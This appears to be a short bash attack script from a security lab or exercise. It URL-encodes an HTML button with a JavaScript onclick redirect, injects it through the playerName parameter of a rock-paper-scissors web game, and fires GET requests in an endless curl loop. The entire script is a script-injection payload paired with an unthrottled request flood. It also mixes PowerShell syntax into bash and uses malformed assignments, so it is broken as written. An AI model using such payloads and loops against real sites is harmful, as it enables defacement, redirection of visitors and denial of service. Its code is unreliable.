#!/bin/bash

# Encoded button tag with JavaScript
encoded_button_tag="%3Cbutton%20onclick%3D%22window.location.href%20%3D%20'https%3A%2F%2Fstone.sifs0005.infs.ch%2F91912126-58d8-4382-a77e-05621539c7f1'%3B%22%3EClick%20Me%3C%2Fbutton%3E"

# Replace && with &amp;&amp;
encodedImgTag = encoded_button_tag -replace "&amp;&amp;", "&&"

# Replace this URL with your target URL
URL = "https://stone.sifs0005.infs.ch/play?playerName=$encodedImgTag&playerHand=Rock&mode=spock"

i=1
while true; do
    echo "Sending GET request $i to $URL"
    curl -s "$URL" > /dev/null
    ((i++))
done
